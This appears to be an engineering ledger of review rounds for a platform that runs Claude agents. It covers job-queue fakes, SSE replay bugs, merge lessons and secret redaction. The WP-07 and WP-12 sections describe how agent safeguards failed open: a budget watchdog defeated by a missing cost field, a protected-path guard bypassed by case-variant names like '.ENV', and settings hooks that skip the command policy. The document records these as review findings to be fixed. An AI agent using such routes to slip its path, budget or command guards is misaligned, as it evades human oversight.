`packages/infrastructure/src/jobs/in-memory-jobs.ts` contained a literal NUL in a template string
(`` `${queue}\0${key}` ``), so **git classified the file as binary**. The damage was silent and
compounding: the entire fix commit's changes to that file — the core of the fake/pg-boss reconciliation —
rendered in the diff as `Bin 15783 -> 16434 bytes`, so a reviewer could not see them; `grep -rn` skipped
the file; and it could not be 3-way merged, which mattered because three worktrees were merging. Replaced
with the `\0` escape; behaviour verified identical (the key is still a NUL-separated composite, and both
the job-name and job-key patterns exclude NUL so the separator stays unambiguous). A repo-wide scan found
no other NUL bytes. **Worth a lint rule if it ever recurs.**

### WP-05 — the fake-versus-production divergence register

Four divergences between the in-memory `Jobs` fake and pg-boss were found across three rounds, each by
reading pg-boss's *source* rather than its documentation: the coalescing bucket (`startAfter` vs the
database's `now()`), the trailing-job extra second in `getDebounceStartAfter`, the retry state (`created`
vs `retry`, which have different index slots), and `retryBackoff` — forwarded by the adapter and silently
ignored by the fake.

Three of those made the fake **kinder than production**, which is the one direction that matters: every
later WP's unit tier trusts the fake, so a fake that admits what pg-boss would block, or fires earlier than
pg-boss would, launders a bug into the unit suite as a pass. The register now lives in the fake's header
under the rule *"stricter than production, never kinder"*, cross-referenced from the retry and concurrency
sites, and distinguishing entries that are genuinely stricter from those that are merely different.

**The rule for every fake in this repo:** a fake may be stricter than the real adapter, never kinder, and
each deliberate difference is written down where the fake is defined. `MemoryEventing` (WP-04) models no
connection pool, which is why a green property run there says nothing about pool sizing.

### Merging two parallel WPs — the real cost, measured

WP-04 and WP-05 ran concurrently in isolated worktrees and neither could see the other. Merging the second
one produced conflicts in six files and one genuine break that no amount of in-worktree verification could
have caught:

- **Mechanical conflicts, resolved as unions:** `packages/{application,infrastructure}/src/index.ts`
  (both added exports), both `package.json` dependency blocks, `.env.example` (both added variable blocks),
  and `pnpm-lock.yaml` (regenerated with `pnpm install`).
- **A semantic break typecheck only found after the merge:** WP-04 added a *required* `connectionTimeoutMs`
  to the database config type — the field that turns pool exhaustion from a silent permanent hang into an
  error — and WP-05's pg-boss integration test builds that config literal without it. Both worktrees were
  green in isolation; the combined tree was not.
- **`docs/OPEN-QUESTIONS.md` numbering collided** exactly as predicted, since WP-05 branched before WP-02
  landed Q36/Q37. Renumbered its calendar question to **Q38** at merge.

**The rule this earns:** worktree parallelism is worth it for genuinely disjoint packages, but *green in a
worktree is not green on `main`*, and the merge must re-run all four verify targets before the commit is
written — not after. Watch particularly for a WP that adds a **required** field to a shared type or a new
runtime invariant (WP-04's `2 × concurrency + 1` pool floor throws at *runtime*, so a stale hand-built
config in another WP's test would not even fail typecheck).

### WP-04a — delete the `DrainScheduler` seam (queued, before WP-06)

Small cleanup, but it must land before WP-06 wires the composition root, because the dead seam actively
misleads: `JOB_QUEUES.dispatch = 'dispatch'` invites WP-15 to enqueue events onto a pg-boss queue that must
not exist. Scope: delete `DrainScheduler`, `OutboxWorkerOptions.scheduler`, `#runWoken`/`#scheduled`, the
`withTimer` branch, `EventingOptions.scheduler` and `JOB_QUEUES.dispatch`; `OutboxWorker` owns its timer
unconditionally; the canonical sweep name is `events.outbox.sweep`, one constant in `outbox.ts`, documented
as a log/metric label rather than a queue name.

**TD-004 amended** (docs win over code, so the record was corrected first): `dispatch(event)` is no longer a
pg-boss workload; there is **no transactional enqueue** (the adapter binds one pool, so `enqueue` cannot join
a handler's transaction — enqueue after commit and re-validate on fire); and `mr.comment.debounce` must use
`stately` + `singletonKey` + `startAfter`, never `coalesce`.

**WP-04a outcome.** Deleted cleanly; the reviewer confirmed `EventingOptions.scheduler` had no production
caller, so no live behaviour was removed. `OutboxWorker` now arms its timer unconditionally on every pass,
and `OUTBOX_SWEEP_JOB` became `OUTBOX_SWEEP_LABEL` — a log and metric field, not a queue name.

The interesting part is the testing. The deleted scheduler tests **could not** have caught a conditionally
armed timer, which is precisely how WP-04's round-2 defect survived its own test suite. The replacements
can, and three independent mutations prove it: removing the `setTimeout` fails 4 tests; arming it only when
there is no broadcast (the exact original defect) fails "polls even while subscribed"; and arming it only on
the first pass fails "re-arms its own timer" with `expected 2 to be greater than or equal to 3` — so the ≥3
threshold is load-bearing rather than arbitrary. **A replacement test is only an improvement if a mutation
shows it detects what the old one missed.**

**4. The same defect, one layer down.** WP-06's first SSE fix exempted replay from being *rejected* by the
slow-consumer cap — but replay frames still incremented the counter the live check reads. So a large replay
poisoned the budget for live frames: three near-full topics plus one live publish arriving mid-drain
delivered **1 of 765 frames** and closed the connection with no `reset`. Reachable at shipped defaults,
because the SSE transport waits for a socket `drain` — a macrotask — exactly when a replay is large. The fix
that works is a separate counter for live frames only.

Worth generalising: when a fix carves out an exception ("replay is exempt from the cap"), check every place
the *underlying quantity* is still shared. The exemption was correct at the rejection site and useless
because the accounting was not exempted with it.

**5. A guard with a hand-maintained scope drifts.** The new `ignored:check` guard listed source roots by
hand, so it did not cover the repository's own root files or `.claude/` — 21 tracked files, including
`vitest.config.ts`, were unguarded, and adding `*.config.ts` to `.gitignore` still passed. A guard against
"files git cannot see" should ask git what it tracks, not carry its own list of where to look.

**WP-06a outcome — the instrument was the bug.** Asked to fix the harness before the code, the implementer
reported the finding that justifies the whole detour: with a realistic transport (two macrotasks per write,
`'drain'` semantics) and the old `settle`, the *currently passing* 766-frame completeness test delivered
**2 of 766 frames**, while `expect(closed).toBe(false)` two lines above passed on that same 2-frame stream.
**No existing assertion could reach the defect.** Three review rounds had each been validated by
instrumentation that could not observe what it certified.

Two further things worth copying. First, the implementer **measured the fix the reviewer and I relayed
instead of applying it**: `#queued >= cap + replayOutstanding` turns out to be arithmetically identical to
the broken `#queuedLive >= cap`, and closed at the same frame 513. The fix that works gates on *growth* past
`#openingBacklog` — the queue depth sealed at the end of `open()` — because a stream that opened at 765 and
still holds 765 is keeping up, while one that has grown past its start by more than the cap is not. Second,
told to hunt a fourth layer, they found **three**: `shutdown()` awaited the whole chain unbounded, so one
stalled reader held `preClose` to the 30s process grace and starved every later step; `publish()` kept
fanning out during shutdown, making the drain a moving target; and `#buffers` was unbounded.

**Five layers, four readers, one shape.** The tally is worth keeping because it is the clearest example in
this repo of a defect class rather than a defect: (1) the cap rejected replay frames; (2) the cap's counter
was shared with replay; (3) replay and live shared the write chain; (4) three more found by the implementer's
own audit — an unbounded shutdown drain, publishes continuing during shutdown, an unbounded buffer map; (5)
the `shutdown` control frame *also* rides the shared chain, and `shutdownDrainMs` is a budget replay and
control share, so a healthy slow client is cut off in silence during shutdown.

Every one is "replay and live share a quantity". Four different readers each fixed the layer in front of them
and each left the next, because each fix was correct. The instruction that finally worked was not "fix this
bug" but **"enumerate every shared quantity between the replay path and anything else, and either fix it or
write down why it is safe"** — a list, not a patch.

Also recorded from this round: the reviewer's own implementation of the relayed fix confirmed it was
algebraically identical to the broken gate (`#queued >= cap + replayOutstanding` ≡ `#queuedLive >= cap`,
same frame 513), and the implementer's new suite fails **8** tests against the shipped `d60d770`, not the 3
they claimed — the tests detect more of the shipped defect than their author realised.

**The rule this earns, and it is the most transferable thing in the ledger:** when a defect keeps returning
one layer down, stop fixing the code and audit the instrument. Ask of every fake: *is it kinder than the
real thing, and can it even reach the state my assertion is about?* A green assertion is worth exactly as
much as the harness's ability to produce the failing state — and a positive assertion (766 frames arrived)
fails loudly on a broken harness while a negative one (`closed === false`) passes silently on the same
wreckage.

### Notes WP-06 must honour (from the architect)

- Nothing calls `registerPartitionMaintenance` yet, so WP-03's daily partition cron never runs. Its returned
  `JobWorker.stop()` must join graceful shutdown.
- pg-boss shares the app pool via `asJobsDatabase`, so `InsufficientPoolError`'s `2C+1` is a **dispatcher
  floor only** — size the pool above it for pg-boss workers and maintenance.
- Pass pino as pg-boss's `onError`; `boss.start()` requires the `pgboss` schema already installed by
  `migrate` (`migrate:false, createSchema:false`).
- A handler that captures the bus and calls the public `dispatch()` self-deadlocks at C=1 — only chained
  events inherit the slot. Put this in the handler docs.

### Notes WP-15 must honour

- **`enqueue` is not in the handler's transaction.** Enqueue after commit, re-validate on fire.
- MR-comment batching: `stately` + `singletonKey: 'mr:<iid>'` + `startAfter: now + 2 min`, and the handler
  re-reads every unresolved thread. Never `coalesce` — the pair with `startAfter` is rejected by the port,
  and both coalescing modes are leading-edge.
- Treat `coalesced` as a success result, and let the handler tolerate finding nothing to do: there is no
  cancel, because timers re-validate.
- `2 × concurrency + 1` holds only while a handler opens at most **one** transaction.

### Checkpoint 1 — after 8 commits (WP-00…WP-05 + WP-02a + ci-fix), 2026-09-09

**What works end to end.** Nothing user-facing yet — M1's foundation is complete but not wired. Concretely:
a pnpm monorepo with the clean-architecture rings and an import-boundary lint that enforces them; every
platform boundary typed in zod and published as JSON Schema; the domain's aggregates, state machines,
policies and permissions as pure functions; a PostgreSQL 18 schema of 45 tables with monthly partitions, a
least-privilege runtime role and an advisory-locked migrator; an event store with a priority dispatcher,
idempotent handlers, per-stream ordering and a transactional outbox; and a jobs runtime on pg-boss with a
working-day calendar. Verification runs in four tiers, the integration tier against a real Postgres
container in ~9s, and CI is green on every gate.

**What is missing.** Everything above the ports: no HTTP server (WP-06), no integrations (WP-07…WP-11), no
Claude runner (WP-12), no run shim or workspaces (WP-13, WP-14), no pipeline interpreter (WP-15), no UI
(WP-20). Nothing in the repository can execute a shell command or call an LLM yet.

**Quality signal.** Seven work packages took **eighteen review rounds** between them. The reviews were not
ceremony: they found two privilege escalations in the database layer (both demonstrated by exploit, one
letting a `CONNECT`-only role destroy a transcript partition, one letting the app role forge a duplicate
event sequence number), fifteen routes to `allow` in the command policy, a dispatcher whose pool exhaustion
was a **permanent silent hang**, a semaphore that admitted two handlers at a limit of one, two drain loops
where the design called for one, a `debounce` that fired immediately, four places where a test fake was
kinder than production, and a literal NUL byte that made a source file binary to git. **Not one of these was
found by reading the diff.** Each needed an exploit, an adversarial corpus, a constructed interleaving, a
removed collaborator, or a mutation of the fix itself.

**Rules this checkpoint earned**, all recorded above with their evidence: a fake may be stricter than the
real adapter, never kinder. A wall-clock assertion is a hardware assertion, not a correctness one. A
comment, an error message or an `.env.example` line asserting an invariant is not evidence it holds. A
differential result is evidence about the corpus, not the program. Green in a worktree is not green on
`main`. And the instrument matters: WP-04's semaphore defect is invisible to a real-Postgres test and only
appears under an in-memory microtask probe.

**Process corrections made:** the protocol's `pnpm -s verify` is `pnpm run -s verify` on pnpm 12; three
implementers plus reviews saturate a 14-core host and make timing tests lie, so concurrency is capped at
two or three; `OPEN-QUESTIONS` numbers and migration filenames collide when worktrees run in parallel, and
the orchestrator renumbers at merge.

**Docs amended from implementation** (docs win, so each was corrected in the record first): technical/02
gained `run.created` and an envelope-`actor` clarification; technical/03 gained the `feedback` table,
`events.id`/`cause_event_id`, a corrected index and a stage-nullability note; technical/12 gained
`features.shadow_mode`; BD-007, product/04 and technical/01 had "2-minute debounce" corrected to a fixed
window; and **TD-004 was amended** to drop `dispatch(event)` as a pg-boss workload and to retract its
"transactional enqueue" claim, which the adapter cannot provide.

### WP-06 — two findings worth remembering beyond this WP

**1. `.gitignore` silently swallowed a source file.** `apps/server/src/data/identity-queries.ts` was matched by
an unanchored `data/` rule meant for a local data directory at the repo root. Everything was green locally
because the file existed on disk; the commit would have landed a tree that does not typecheck, and CI would
have been the first thing to notice. **`git add -A` does not warn you about this** — the orchestrator's own
merge would have shipped it. Rule: an ignore pattern for a repo-root directory must be anchored (`/data/`,
not `data/`), and a WP that adds a new source directory should run `git check-ignore` over its own change set
before reporting DONE. `*.log` is unanchored for the same reason and should be checked.

**2. A whole test tier was proving less than it appeared to.** `@better-auth/core`'s `isTest()` sets
`skipOriginCheck = true`, so **every e2e test runs with Better Auth's origin check disabled**. The e2e suite
therefore says nothing about CSRF on `/api/auth/*`, while looking exactly like it does. The reviewer only
found this by standing up an out-of-test instance against a real Postgres — where the defences turned out to
be sound. Generalisation for later WPs: *a library that detects test mode changes what your tests cover*, and
security behaviour in particular must be verified with `NODE_ENV=production` at least once, not inferred from
a green suite.

**3. Completeness is a different assertion from ordering.** The SSE hub's replay dropped **every** frame when
a reconnect spanned two or more topics — 0 frames delivered at production defaults, the stream closed with no
`reset`, so a client reconnects into the same wall forever. The existing tests asserted ordering and dedup on
the live path and the cap on the live path, but nothing asserted that a replay delivers *all* missed frames.
Two correct assertions did not add up to the one that mattered.

### WP-06a — the SSE write chain, and a harness that cannot see it (carried out of WP-06)

**Why a separate WP.** WP-06's three review rounds were spent, and the same precedent as WP-02a applies: the
round-3 finding is a *newly discovered layer*, not a repeated failure to fix the same thing, and blocking a
working server skeleton would stall WP-07 and WP-20. Nothing publishes to the hub yet, so the defect is
latent — but **WP-12 and WP-15 make it live**, and it must land before them.

**Defect 1 — the third layer of the cap bug.** Rounds 1-3 each fixed a real thing and each left the next
layer: (a) the cap rejected replay frames; (b) the cap's *counter* was still shared, so a replay poisoned the
live budget; (c) replay and live still share the **write chain** `#chain`, so no live frame drains until the
replay has, and `#queuedLive` therefore counts "live frames that arrived during the replay" rather than
consumer speed. Measured at shipped defaults with a paced producer writing at the socket's own rate: 255
replay + 800 live → fine; 510 + 800 → fine; **765 replay + 520 live → CLOSED at frame 514, no `reset`,
connection count 0**; 765 + 400 → fine. Only replay length decides. It dies iff replay exceeds
`maxQueuedLiveFrames` — 3 topics × 256 buffer = 768 > 512 — which is an ordinary browser tab reconnecting on
`org` plus a project plus a task. And because a browser `EventSource` carries one cursor, the other topics
get neither replay nor `reset`. The reviewer's minimal fix: gate on `#queued >= cap + replayOutstanding`
(outstanding only decreases, so a stalled reader still trips it) and write `reset` before `close()`.

**Defect 2 — and this is the more important one. The test harness cannot observe the defect it certifies.**
`settle()` returns after **one** turn without progress. A real socket write costs two macrotasks
(write→false, `'drain'`, completion); make the fake cost two and the *passing* 766-frame test reports **2**.
It fails loudly there only because that assertion is positive — the same detector next to
`expect(closed).toBe(false)` passes silently. The completeness test also injects **one** live frame against a
cap of 512, the minimum possible probe, which is precisely why it cannot see defect 1. **Fix the harness
first, then the code**, or the fix cannot be validated. Three rounds of this bug were each hidden by test
infrastructure that resolved too eagerly, and the implementer twice discovered their own helper could not
observe what it claimed to.

**The lesson, stated plainly because it has now cost three rounds:** when a defect keeps coming back one
layer down, stop fixing the code and go audit the instrument. A green assertion is only as good as the
harness's ability to reach the state being asserted about.

Also in scope: the memory figures are decimal numbers with binary labels (660×256×64 = 10.31 MiB, not
"10.8 MiB"; ×1000 = 10.07 GiB, not "10.5 GiB"); `SOURCE_ROOTS` lacks `'.'`, so a new *untracked* root-level
file under a swallowing rule is caught by neither arm of `check-ignored.mjs`; `#buffers` is never pruned per
topic outside `shutdown`, unlike `#byTopic`; and mutation H's `/events` e2e test kills by a 5s inject timeout
rather than an assertion.

### WP-06a — review round 2: the sixth layer, found exactly where the audit said to look

**Verdict REQUEST_CHANGES**, one blocking finding. The reviewer derived the shared quantities from the code
before reading the ten-entry audit and matched it **10/10** — then found two the audit had missed and one it
stated wrongly, and the blocking defect was in the entry the audit was proudest of.

**The blocking finding.** `hub.ts:465` claims "exactly one of the two paths reaches the wire" of the on-chain
`shutdown` (`:807`) and the off-chain one in `abandon()` (`:540`). False: if the on-chain link is in flight —
past its `#closed` check, awaiting drain — when the deadline fires, **both** write. Reproduced with `drainMs`
20 and the transport slowed for the `shutdown` frame only: the wire was `["ping","reset","shutdown","shutdown"]`,
and because `@fastify/sse`'s `send()` hands bytes to the stream synchronously, a real client sees
**`shutdown, reset, shutdown`** — a `reset` *after* the frame that ends the stream, which is the exact
"client reconnects into the same wall" failure this WP exists to prevent.

**Why it matters beyond this file.** Five layers were "replay and live share a quantity". The sixth is "the
on-chain and off-chain shutdown share *whether the client has been told*" — an obligation, not a buffer or a
counter. The audit enumerated every shared *thing* and missed the shared *fact*. Rules 9 and 10 above are
what this earned.

**The other findings.** Audit entry 7 ("nothing closes mid-replay except `#dropStalled` and `abandon`") omits
three closers — `write`'s `.catch` (`:442`), `SseHub.close` (`:777`), and `open()`'s same-id displacement
(`:617`); all benign, but an audit is worth only its exhaustiveness and this one is trusted. `#byTopic`
(`:563`) is missing entirely: `publish` iterates the `Set` while `#dropStalled → close → #onDropped` deletes
the current element re-entrantly — safe by spec, unstated. `check-ignored.mjs` (rule 7 corollary above).
`config.ts:130` has no refinement that `sseShutdownDrainMs < shutdownTimeoutMs`; both independently reach
600 000, which makes the drain budget meaningless.

**What the round confirmed as sound.** `abandon()` is genuinely off-chain on every path, both writes guarded
by `isConnected`; no cross-connection starvation, because `#chain`, `#queued` and the deadline are
per-connection and all `withDeadline` timers start in one synchronous `map`, so `preClose` is bounded by a
single `shutdownDrainMs` (measured 25 ms at drainMs 20). **All the memory arithmetic recomputed correct**:
255×64+512 = 16,832; ×660 = 11,109,120 B = 10.594 MiB; 512×660 = 330.0 KiB exactly; ratio 32.875 → "33×".
Binary labels now match binary units. **Six mutations, every one killed by a named assertion and none by a
timeout** — growth-gate→depth-cap and `sealOpeningBacklog`→0 each killed 4 (`expected 1 to be 400/520/800`);
`withDeadline`→unbounded killed `expected 'shutdown never returned' to be 'drained 1'`; `abandon`→on-chain
killed `expected ['ping@-'] to include 'reset@-'`; `#evictBuffers`→no-op killed 3 buffer-retention
assertions; removing the publish-during-shutdown guard killed `expected 'steer@run:…' to be 'shutdown@-'`.
No test was weakened and two were strengthened: `routes.test.ts:98` replaced a bare `await inflight` — killed
only by vitest's 5 s timeout, the ledger's mutation H — with a raced deadline plus a named assertion.

**`MAX_STALLED_TURNS = 500` is a disguised threshold, not a proof** ("250 × two turns" is a constant on
elapsed turns; the impossibility argument needs "no timer or external release is outstanding"). It holds
today only because no test `settle`s while a `setTimeout` is the only source of progress. Direction of
failure is safe — false failure, never false pass — so it was filed as a note.

**Round 3 (the last one this WP gets) is in flight**, briefed to reproduce the `shutdown, reset, shutdown`
wire as a failing test *before* fixing it, and to **measure** the reviewer's proposed arbitration flag rather
than apply it — the same discipline that at round 1 proved the reviewer's `#queued >= cap + replayOutstanding`
algebraically identical to the broken gate it was meant to replace.

### WP-06a — review round 3: APPROVE, and the seventh layer found anyway

**Round 3 verdict APPROVE.** The reviewer re-derived all ten shared-state entries and all five obligations
from the code before reading the audit, matched **10/10 and 5/5**, and then found the seventh layer:

**`SseHub.shutdown()` (`hub.ts:939`) is not re-entrant.** Two concurrent calls snapshot the same connections
twice and `write()` enqueues a second `shutdown`; the second link passes both `#closed` and `isConnected` and
writes — measured wire `["ping@-","shutdown@-","shutdown@-"]`. The shape is the point: the on-chain link
*sets* `#shutdownAnnounced` but never *reads* it, so round 2's arbiter does not arbitrate on-chain against
on-chain, and the audit's claim that the two paths "partition the race exactly — no gap and no overlap" is
false because **there are three paths, not two**. Filed as should-fix rather than blocking because the
reviewer measured that it is unreachable through the composition root: Fastify's `preClose` fires exactly
once for both concurrent and sequential `app.close()`, and `runtime.stop():229` has its own guard.

**What round 3 confirmed.** Round 2's implementer was right to measure the proposed arbitration flag instead
of applying it — the reviewer independently ran the mutation the implementer had *not* run (keep the
`shutdown` dedupe but move the flag read past the `reset`s) and killed it with wire `shutdown,reset,reset`,
so the "claim the flag before `abandon()`'s `reset`s" refinement is empirically load-bearing rather than
rhetoric. All five constructed interleavings pass; a stalled plus a healthy connection drain in 22 ms at
`drainMs` 20, i.e. one budget, not two. `MAX_STALLED_TURNS` is **gone** — `settle` now proves hopelessness
structurally (every write parked on a gate only `close()` releases), with `MAX_DRAINING_TURNS = 50` bounding
only the ungated case and the residual unprovable case written down at the constant.

**Two audit omissions remain, both benign:** `#shuttingDown` itself, and `connection.topics`, which
`updateSubscriptions` mutates while `#resetEveryTopic`/`SseHub.close` read it (probed during the drain:
leaks nothing, `watchedTopics: []`).

### WP-06a — the merge found what no worktree could: standing rule 6, exactly as written

Squash-merging the APPROVED branch turned `main` **red**, and nothing in three review rounds could have
caught it. WP-06a's whole contribution to `check-ignored.mjs` was to derive its scope from `git ls-files`
instead of two hand-maintained lists. `.claude/` is a tracked top-level directory, so the derived walk
descends into it — and on `main`, `.claude/worktrees/agent-<id>/` is a **separate git worktree**, a second
checkout of this repository, correctly ignored by `.gitignore:45`. The guard reported every source file in
it and failed `verify`.

It was green in the review worktree for one reason only: that worktree lives outside the repository, so it
contains no nested checkout. **A guard that inspects the repository is a guard whose result depends on where
it is run from** — and the orchestrator's own parallelism is what put a checkout inside the repository.

The fix must not be another list. The non-drifting rule is git's own: **a directory containing a `.git`
entry is a separate repository or worktree, so do not descend into it.** A linked worktree has `.git` as a
*file* (an 84-byte `gitdir:` pointer); a nested clone has it as a directory; handle both. `.gitignore:45` is
also unanchored (`.claude/worktrees/`), which violates this repository's own convention — anchored to
`/.claude/worktrees/` as well, though that is *not* the fix: anchoring changes which pattern matches, not
whether the walk enters another checkout.

Both this and the round-3 should-fix went out in one short follow-up round, with a test for each that must
fail by a **named** assertion when the fix is reverted. The nested-checkout test builds a real linked
worktree rather than a directory *named* `worktrees` — a test that asserts the walk skips a name tests
nothing — and asserts in the same run that a genuinely swallowed source file still **fails**, so it cannot
pass by the guard having been switched off (standing rule 4: a negative assertion passes silently on a
broken harness, so pair it with a positive one).

### WP-07 — review round 1: the fakes are the product, and rule 1 is decided here

**Verdict REQUEST_CHANGES**, three majors. WP-07 is where standing rule 1 stops being advice: five fakes
become the unit-tier ground truth for WP-08…WP-11, WP-15 and the whole pipeline, and the implementer
declared **six groups of "kinder than production" divergences** openly. The reviewer's job was to price each
one. Verdicts: task-management acceptable · **git must be made stricter** · communication acceptable ·
errors acceptable · logs acceptable · application-ring doubles acceptable.

**Major — a secret reaches the log.** `action-executor.ts:352`: the audit-**failure** branch logs
`err: errorMessage(error)` unredacted, while `:232` redacts the same string for the audit row. The WP's own
test at `action-executor.test.ts:180-201` proves an error message can carry an injected token. The redaction
is present on the path that succeeds and absent on the path that fails — TD-012 and BD-002 both violated by
the same omission. Treated as a *class* in the fix brief: every site where an error, a provider payload or a
response body is logged, thrown or attached to an event rather than written to the audit row.

**Major — the shadow guard fails open.** `action-executor.ts:86,274`: `mode` is optional and defaults to
`'normal'`, so a call site that forgets `mode: task.mode` — WP-15 makes these calls — gets a **real** side
effect where shadow mode was intended. In shadow mode no side effect may reach a provider; a safety guard
whose default guesses "not shadow" is inverted. The file's own docblock already argues for making
`shadowResult`/`describeResult` required; the argument applies harder to `mode`.

**Major — the shared suite bakes in the wrong error code.** The git fake throws `invalid_request` for a
duplicate open MR (`fake.ts:661`); its own register says `conflict` (`fake.ts:18`) and `common.ts:69` maps
GitLab's real **409 → `conflict`**. `git-provider-contract-suite.ts:191` asserts the fake's code, so WP-09
must either mis-map a real 409 or weaken the suite — both defeat a shared suite. Found only by reading
`common.ts`: the register and the code disagreed and nothing failed.

**The kindest divergence in the WP was untested.** Hard-coding `mergeable: true` at `git/fake.ts:365` passes
**39/39** unit and contract tests. "Mergeability is whatever the seed says" is exactly the divergence WP-26's
rebase gate will trust, including the `null` case.

**And five registers justified a kindness by pointing at tests that do not exist.** All five fakes explain
"no quota unless scripted" with "the scripted path is what the executor's tests drive" — the executor's
tests use lambdas, and **nothing anywhere composes a fake with `IntegrationActionExecutor`**. The rate-limit
path is therefore unexercised by default in every unit suite that will trust these fakes, while the register
says the opposite.

**Rules earned:**
11. **A register entry that justifies a kindness by pointing at a test elsewhere must name a test that
    exists.** A justification is a claim about the suite, and claims about the suite are checkable.
12. **A fake's kindest divergence needs a positive assertion, not a warning.** Documenting a divergence is
    necessary and not sufficient: the one place a fake is most permissive is the one place a later WP will
    lean hardest, so it needs a test that fails when the divergence widens.

**Also found:** the "shadow mode null adapter" named in WP-07's plan line and referred to by
`integrations/index.ts` and `task-management/fake.ts:3` **is implemented nowhere** — shadow mode is a guard
inside the executor instead. Two suite assertions are still fake-shaped and are the first thing WP-08 would
have to change (`task-management-contract-suite.ts:269`, where real Jira yields `unsupported_event` rather
than `malformed_payload`, and `git-provider-contract-suite.ts:275`), which is a direct BD-017 violation.
`IntegrationActionEntry` carries five fields `integration_actions` has no columns for (`0007_cost.sql`,
technical/03:70) — recorded in `docs/TODO.md` rather than fixed, because no adapter persists them yet and
parallel WPs collide on migration numbers.

**Confirmed sound:** the dependency rule holds and the biome overrides were extended rather than weakened;
`parseProviderData` sits at the ring edge (BD-022); caps are strict; idempotency scope, replay and
audit-before-throw are correct apart from the redaction gap; tiering and coverage correct; **all five doc
amendments to technical/06 are doc-proven-wrong rather than doc-found-inconvenient**, and the audit
row/event split matches technical/02:120.

### WP-07 — review round 2: APPROVE, and four leaks built against the real serialiser

**Verdict APPROVE**, three should-fix items, no blockers — all five fixed before the merge rather than
filed, because the next four work packages are the ones that make them reachable.

**Round 2's own work was good.** Major 1 was treated as a class rather than a line, and the site that
mattered was not the one the review named: the **rethrow**. The error escapes the executor into
`apps/server`'s `{ err }` handler, so redacting the audit row was never enough; `redactErrorInPlace` now
scrubs message, stack and the whole `cause` chain in place while preserving error identity. Major 3 widened
usefully — re-reading all 17 suite assertions found two that were adapter *obligations* no port stated
(`cloneUrl` refusing a revoked credential, Slack's `channel_not_found` arriving as `200 {ok:false}`), now
moved onto the ports so WP-09 and WP-10 learn them from the contract instead of from a red suite. And
`Object.freeze` turns out not to seal `stack` at all — V8 exposes it as a prototype accessor.

**But the reviewer constructed four working leaks**, each verified against the **real**
`pino-std-serializers@7.1.0` the server uses rather than against the redactor's own tests: own enumerable
fields are never walked (`err.js:29-38` copies every `for…in` key, so an axios-shaped
`config.headers.Authorization` survives into `util.inspect`, `JSON.stringify` and the pino err object);
`AggregateError.errors[]` is never walked (`err.js:24-26`); and a `cause` chain deeper than the redactor's
`MAX_CAUSE_DEPTH = 8` returns `count=0` while pino's `messageWithCauses` walks it unbounded. **None is
reachable from code shipped in WP-07** — all five fakes throw `IntegrationError`, whose own fields are
`code`/`provider`/`action`/`retryable`, and pino skips a *cause's* own fields — which is precisely the
argument for fixing it now: WP-08…WP-11 introduce real provider SDK errors, and an axios or undici error
carries the credential as an own enumerable field.

**The shadow guard still failed open at runtime.** Round 1 made `mode` required in TypeScript; the reviewer
probed it live and a JavaScript caller omitting `mode` — or passing `'SHADOW'` for `'shadow'` — got
`status: ok` and a real `perform()`. Round 1's mutation had died as `TS2578`, which proves the compiler and
not the code. Rules 13 and 14 above are what these two earned.

**"The redaction is on one branch and not the other" recurred a third time in one file** (`:443` rethrows
`auditError` unscrubbed while `:449` scrubs it), so the fix round was asked not just to patch it but to name
what would prevent a fourth — a choke point, a lint rule, or a type that cannot be thrown unredacted.

**The reviewer's independent count of unredacted-text sites was 13, not the 7 examined.** They agreed the
two deferred gaps are correctly deferred — there is no write path to `events.payload` yet, so "redaction at
write" has no write to attach to — but made the better point that the obligation belongs on
`IgnoredDelivery.detail` and `HealthProbe.detail` themselves, where WP-08 will meet it, not only in a
backlog file nobody opens while coding.

**Confirmed sound:** `describe.each` genuinely drives `failNext(429)` through all five fakes and asserts
`core.calls === 2` for each (rule 11 discharged); every register citation names a test that exists; each
fake's kindest divergence carries a positive assertion, mergeability included, with `null` distinguished
from `false` for WP-26's rebase gate; suites are structurally reusable, the harness supplying ids, statuses,
deliveries and even the ignore reason, with the first remaining friction being fresh-context-per-test
against recorded cassettes; no third-party dependency added; biome overrides correct; ports strict-zod and
snake_case; `secretFields` guarded at registration. The shadow-null-adapter removal was judged sound on the
right grounds — a null adapter bypasses the executor and writes no `would_have` row, which product/12's
ShadowReport needs.

**Discovered work:** nothing connects `ProviderCreateInput.secrets` to `exactSecretRedactor`, so WP-15 can
hand a provider a secret the redactor never learns — and `redaction_count`, the only signal that would show
it, has no column yet.

### WP-12 — review round 1: two guards that fail open, and an SDK read that was right

**Verdict REQUEST_CHANGES.** Both majors are demonstrated rather than argued, and both fail **open** — the
direction where a green suite means nothing.

**The budget watchdog is defeated by one missing field.** The reviewer replayed the `happy-path` fixture with
`total_cost_usd` deleted from the `result` line — the SDK passes that field through **unvalidated** — and got
`status=completed`, `terminalReason=success`, `cost.usd=NaN`, `maxBudgetUsd=0.01`, watchdog silent, because
**`NaN > 0.01` is false**. The transcript's `result` row is replaced by a `transcript_normalisation_failed`
row, so the only loud signal is a different row from the one the pipeline reads, and `NaN` flows on into
WP-19's ledger. WP-12's own docblock states the principle it violates — *"'the vendor enforces it' is a claim
about a binary the platform ships but does not control"* — and **WP-13's `agentic-runlet` is the untrusted
producer of this stream**, so it is not a hypothetical about a well-behaved CLI.

**The path guard inherits the filesystem's equivalence classes.** Matching is case-sensitive, so with
`protectedPaths: ['infra/**', '.env']` it returns `allow` for `.ENV` and `INFRA/main.tf` and no flag for
`.CLAUDE/settings.json`. The reviewer then **wrote `.ENV` on an APFS volume and overwrote `.env`**. Protected
paths have **no container backstop** — the mount is writable — so this guard is BD-024's only enforcement and
it fails open on `local` mode and on every macOS or Windows bind mount. Thirty-one other constructed inputs
did *not* escape: `..` in several encodings, deep `..`, absolute, `/proc`, `/dev`, `..%2f`, backslash, `~`,
`.`, empty and whitespace all deny, and `%2e%2e` and fullwidth dots stay inside as literal names.

Rules 15 and 16 above are what these two earned.

**A second silent shadow of `canUseTool`.** `settingSources: ['project']` loads the workspace's
`.claude/settings.json`, whose permission-allow rules shadow the callback — the SDK says so in the same
warning string the implementer had already acted on — and whose hooks run commands that never reach
`evaluateCommand`, bypassing the command policy WP-02 and WP-02a spent three review rounds and fifteen closed
`allow` routes building. BD-025 limits the blast radius to the project owner's own default-branch file, which
is why it was should-fix rather than blocking, and the SDK offers the exact remedy
(`managedSettings.allowManagedPermissionRulesOnly` / `allowManagedHooksOnly`).

**Standing rule 11 fired again, in the second consecutive work package.** A fake's divergence register cited
`claude-runner.sdk.test.ts`, which does not exist. The substance held — the real `query()` *is* driven
through `fakeSpawnClaudeCodeProcess` in `claude-runner.test.ts` — so it was a stale name, but that is exactly
